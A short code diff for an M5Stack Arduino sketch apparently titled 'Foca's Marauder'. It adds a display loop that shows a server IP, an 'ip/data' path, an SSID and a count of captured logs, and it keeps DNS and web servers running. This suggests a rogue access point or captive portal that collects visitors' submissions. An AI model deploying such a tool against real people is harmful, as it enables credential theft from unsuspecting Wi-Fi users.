@@ -133,6 +133,27 @@ void setup() {
 }
 
 void loop() {
-  // put your main code here, to run repeatedly:
-
+  if ((millis() - lastTick) > TICK_TIMER) {
+    lastTick = millis();
+    if(capcount > previous){
+      previous = capcount;
+    
+      M5.Lcd.fillScreen(BLACK);
+      M5.Lcd.setSwapBytes(true);
+      M5.Lcd.setTextSize(2);
+      M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
+      M5.Lcd.setCursor(0, 10);
+      M5.Lcd.print("Foca's Marauder");
+      M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
+      M5.Lcd.setCursor(0, 35);
+      M5.Lcd.print("Server: ");
+      M5.Lcd.println(APIP);
+      M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
+      M5.Lcd.print("ip/data\n");
+      M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
+      M5.Lcd.printf("SSID: %s\n", SSID_NAME);
+      M5.Lcd.printf("Logs: %d\n", capcount);
+    }
+  }
+  dnsServer.processNextRequest(); webServer.handleClient();
 }
